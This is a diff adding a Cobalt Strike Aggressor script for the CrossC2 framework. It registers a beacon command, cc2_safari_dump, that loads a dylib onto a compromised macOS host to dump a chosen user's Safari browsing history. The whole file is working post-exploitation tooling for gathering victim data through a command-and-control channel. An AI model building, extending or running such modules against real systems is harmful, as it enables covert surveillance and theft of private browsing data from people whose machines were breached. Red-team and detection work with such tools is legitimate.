@@ -1,0 +1,28 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+sub printUsage_safari_dump {
+    blog($1, "\nUsage: cc2_safari_dump <username> <dump count>\n\tdump browser history from Safari.\nEx:\n\tcc2_safari_dump test 100");
+}
+
+ssh_alias cc2_safari_dump {
+    $taskName = "cc2_safari_dump"; # taskName
+    $taskType = "dylib";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "info"; # keystrokes -> keylogger message
+
+    $beaconid = $1;
+    $username = $2;
+    $queryCount = $3;
+    $transportArg = $username."^".$queryCount;
+
+    if ($username && $queryCount) {
+        $loadlib = "gather/browser/safari_dump.dylib";
+        blog($beaconid, "cc2_safari_dump: ");
+        bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    } else {
+        printUsage_safari_dump($beaconid);
+    }
+
+}
+
+ssh_command_register("cc2_safari_dump", "CrossC2 safari dump - dump browser history from Safari(default 500).", "\nUsage: cc2_safari_dump <username> <dump count>\n\tdump browser history from Safari.\nEx:\n\tcc2_safari_dump test 100");
